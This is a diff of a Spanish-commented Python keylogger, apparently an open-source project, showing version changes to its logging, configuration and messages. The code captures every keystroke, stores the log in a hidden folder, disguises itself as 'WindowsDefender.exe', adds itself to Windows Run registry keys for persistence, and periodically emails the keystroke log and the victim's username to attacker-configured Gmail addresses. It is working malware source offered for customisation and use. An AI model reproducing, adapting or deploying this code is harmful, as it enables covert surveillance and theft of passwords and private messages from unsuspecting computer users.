@@ -10,7 +10,7 @@
 # █████═╝░█████╗░░░╚████╔╝░██║░░░░░██║░░██║██║░░██╗░██║░░██╗░█████╗░░██████╔╝
 # ██╔═██╗░██╔══╝░░░░╚██╔╝░░██║░░░░░██║░░██║██║░░╚██╗██║░░╚██╗██╔══╝░░██╔══██╗
 # ██║░╚██╗███████╗░░░██║░░░███████╗╚█████╔╝╚██████╔╝╚██████╔╝███████╗██║░░██║
-# ╚═╝░░╚═╝╚══════╝░░░╚═╝░░░╚══════╝░╚════╝░░╚═════╝░░╚═════╝░╚══════╝╚═╝░░╚═╝  v3.4.0
+# ╚═╝░░╚═╝╚══════╝░░░╚═╝░░░╚══════╝░╚════╝░░╚═════╝░░╚═════╝░╚══════╝╚═╝░░╚═╝  v3.3.3
 
 # Librerías Utilizadas
 from pynput.keyboard import Key, Listener
@@ -24,7 +24,7 @@ import yagmail
 import shutil
 import time
 import threading # Hilos
-import socket   # Librería verifica internet 
+import socket    # Librería verifica internet 
 
 
 # Convierte tecla a un valor legible
@@ -173,8 +173,8 @@ def KeyConMax(argument):                # Botones, comunes // Optimizados
         "None<110>": ".",                 #
         "Key.alt_l": " [Alt L] ",         #
         "Key.alt_r": " [Alt R] ",
-        #"Key.shift_r": " [Shift R] ",
-        #"Key.shift": " [Shift L] ",
+        "Key.shift_r": " [Shift R] ",
+        "Key.shift":   " [Shift L] ",
         "Key.ctrl_r": " [Control R] ",    #
         "Key.ctrl_l": " [Control L] ",    #
         "Key.right" : " [Right] ",                 #
@@ -192,7 +192,7 @@ def KeyConMax(argument):                # Botones, comunes // Optimizados
     }
     return switcher.get(argument, "")
 
-# Obtiene registro de teclas y guarda en un archivo log.txt
+# Obtiene registro de teclas y guarda en un archivo reg.k
 def Klogger():
     try:        # Intenta crear el archivo
         log = os.environ.get('pylogger_file', os.path.expanduser(logKeyPath()+LogName()) )
@@ -206,7 +206,7 @@ def Klogger():
     
     def on_press(key):
         with open(log, "a") as f:
-            if (len(str(key)))  <= 3:
+            if (len(str(key))) <= 3:
                 print("Se oprimio la tecla: "+KeyConMin(str(key))) 
                 f.write(KeyConMin(str(key)))
             else:
@@ -215,7 +215,7 @@ def Klogger():
     with Listener(on_press=on_press) as listener:   # Escucha pulsaciones de teclas
         listener.join() 
 
-# Envía los datos log.txt vía Gmail 
+# Envía los datos reg.k vía Gmail 
 def sendEmail(log, sender_email, sender_password, receiver_email):
     try:
         mifecha                 = datetime.datetime.now()
@@ -228,10 +228,10 @@ def sendEmail(log, sender_email, sender_password, receiver_email):
             "Información:\n\nNombre de Usuario: "+ str(getuser()) + informacion
         ]
         yag.send(receiver_email, subject, contents, attachments=log )
-        print("[+] Se envió el correo correctamente")
+        print("[+] Se envió el Registro de teclas correctamente")
         return True
     except:
-        print("[-] No se pudo envíar el correo")
+        print("[-] No se pudo envíar el Registro de teclas")
         return False
 
 # Renombre el archivo log, antes de ser envíado
@@ -242,7 +242,9 @@ def Rename(name):
         pathO = logKeyPath()+ LogName()
         pathN = logKeyPath()+ name
         os.rename(pathO, pathN)
+        print("El archivo reg.k se renombró correctamente")
     except:
+        print("No se puedo renombrar el archivo 'reg.k' ")
         pass
 
 # Función = Verifica si hay conexión a internet para poder envíar el log
@@ -251,8 +253,10 @@ def VerificarConexion():
     try:                                                            # Intenta conectarse al servidor de Google
         con.connect(('www.google.com', 80))
         con.close()
+        print("Conexión a internet => [OK]")
         return True
     except:
+        print("Conexión a internet => [NO]")
         return False
 
 # Crea el directorio oculto 
@@ -270,7 +274,7 @@ def CreateDir():
 def EscondeKey():
     CreateDir()  # Crea el directorio ==> C:\Users\Public\Security\Windows Defender
     try:
-        with open(FilePath(), 'r') as f:      # Verifica si el keylogger se encuentra oculto en el sistema
+        with open(FilePath(), 'r') as fd:      # Verifica si el keylogger se encuentra oculto en el sistema
             print("El keylogger ya se encontraba oculta en la carpeta: \n["+FilePath()+"]")
     except :
         print("El Keylogger no se encuentra escondido...\nSe tratará de esconderlo...")
@@ -280,19 +284,17 @@ def EscondeKey():
         except:
             print("\nHubo un problema al esconder el El keylogger")
 
-# Intervalo de tiempo que se enviará el archivo log.txt
+# Intervalo de tiempo que se enviará el archivo reg.k
 def SendLog():
     n = 1   # Para renombre los archivos
     while (True):
         n = n+1
-
         time.sleep(timeSend()*60) 
-
-        if VerificarConexion(): # Continua solo si hay conexión
+        if VerificarConexion(): # Continua solo si hay conexión a internet
             # Crea nombre del archivo
             nameFile = str(getuser())+" "+str(n)+".txt"
             #Renombra el archivo original
-            Rename(nameFile)    # Cambia el archivo `log.txt` a  `log2.txt`
+            Rename(nameFile)    # Cambia el archivo `reg.k` a  `log2.txt`
 
             #Envía el archivo renombrado
             CreateDir()  # Crea el directorio ==> C:\Users\Public\Security\Windows Defender
@@ -315,7 +317,7 @@ def addStartup():  # function =  Iniciar automaticamente
     keyVal = r'Software\Microsoft\Windows\CurrentVersion\Run'                       # Path del registro
     def verificar():
         try:  # Intenta crear la dirección
-            os.makedirs('C:\\Users\\Public\\Security\\Microsoft')                   # Carpeta especial de verificación de startup 
+            os.makedirs('C:\\Users\\Public\\Security\\Microsoft')                   # Carpeta especial de verificación de startup <No cambiar si no sabe lo que es>
             return True # Se creó la carpeta
         except:
             return False# La carpeta ya existe
@@ -323,46 +325,55 @@ def addStartup():  # function =  Iniciar automaticamente
         registry = OpenKey(HKEY_LOCAL_MACHINE, keyVal, 0, KEY_ALL_ACCESS) # machine
         SetValueEx(registry,name, 0, REG_SZ, path)
         verificar() # Crea Carpeta
-    except: # Si no tien permisos de administrador
+    except: # Si no tiene permisos de administrador
         if (verificar()):
             registry = OpenKey(HKEY_CURRENT_USER, keyVal, 0, KEY_ALL_ACCESS) # local
             SetValueEx(registry,name, 0, REG_SZ, path)
-def GetPassChrome():
-    pass
 
+# ***************************************   ZONA CUSTOM AVANZADA  ***********************************
 
+# NOTA:| Solo Cambie éstas variables si sabe      |
+#      | lo que está haciendo, en caso contrario  |
+#      | el Keylogger no funcionará correctamente |
 
-# ************************************************   ZONA CUSTOM   *********************************
 def GetNameKey():                   # Retorna el nombre del Keylogger compilado *.EXE
     return "WindowsDefender.exe"    # este archivo debe tener el mismo nombre "WindowsDefender.py"  
-def GetPathOcult():                 # Path de la carpeta donde se ocultará el Keylogger y log.txt
+def GetPathOcult():                 # Path de la carpeta donde se ocultará el Keylogger
     return "C:\\Users\\Public\\Security\\Windows Defender\\"
 def logKeyPath():   # Ruta del registro de teclas.
-    return "C:\\Users\\"+str(getuser()) +"\\AppData\\Roaming\\Microsoft\\"
-def LogName():  # Nombre del registro de teclas
-    return ".k"
+    # Ruta donde se guardará temporalmente el Registro de teclas
+    return "C:\\Users\\Public\\Security\\Settings\\"
+def LogName():  # Es el nombre que tendrá el registro de teclas.
+    return "reg.k"             # <= Opcional, cambie de nombre al archivo 
 def FilePath():
-    return GetPathOcult()+GetNameKey()
+    return GetPathOcult()+GetNameKey()  # <No cambiar>
+
+# ************************************  FIN ZONA CUSTOM AVANZADA   *********************************
+
+####################################################################################################
+
+# ************************************  FIN ZONA CUSTOM BÁSICA   *********************************
 
 # Correo de envío [Primaria] 
 def emailP():                   # <<== Cambia éste correo
     return "correo1@gmail.com" 
 def passP():                    # <<== Contraseña del correo
-    return "pass1"
+    return "contra1"
 # Correo de envío [Segundaria]     <=> Solo si hay algún problema de envío con el correo Principal
 def emailS():                   # <<== Cambia éste correo
     return "correo2@gmail.com"
 def passS():                   # <<== Contraseña del correo 
     return "pass2"
 
-def timeSend():                 # Tiempo de Envío erzonalizado
-    return 120                  # tiempo en minutos
+def timeSend(): # Tiempo de envío perzonalizado
+    return 120 #Minutos                 <= Escoja su tiempo en minutos
 
-#Correos que recibirán los archivos log
+#Correos que recibirán el registro de teclas.
 def ReceiveE():
     #return ["Recibe1@gmail.com", "Recibe2@hotmail.com", "Recibe3@yahoo.com"]   # MultiCorreo
-    return ["recibe@gmail.com"]                                               # MonoCorreo
-# *********************************************   FIN ZONA CUSTOM   *******************************
+    return ["CorreoReceptor@gmail.com"]                                         # MonoCorreo
+# ************************************  FIN ZONA CUSTOM BÁSICA   *********************************
+
        
 # Inicio multihilo
 if __name__ == '__main__':
@@ -378,7 +389,7 @@ if __name__ == '__main__':
 #################################################################
 #                                                               #
 #                 Developed by SebastianEPH                     #
-#                                                   v.3.4.0     #
+#                                                   v.3.3.4     #
 #################################################################
 # NOTAS IMPORTANTES:
 #
